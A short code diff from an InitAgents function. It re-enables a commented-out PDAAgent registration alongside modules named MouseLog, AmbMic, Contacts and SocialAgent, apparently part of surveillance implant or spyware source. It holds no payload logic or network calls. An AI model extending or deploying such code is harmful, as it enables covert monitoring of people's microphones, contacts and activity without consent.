@@ -424,7 +424,7 @@ void InitAgents()
 	PM_DeviceInfoRegister();
 	PM_MouseLogRegister();
 	PM_ApplicationRegister();
-	//PM_PDAAgentRegister();
+	PM_PDAAgentRegister();
 	PM_ContactsRegister();
 	PM_AmbMicRegister();
 	PM_SocialAgentRegister();
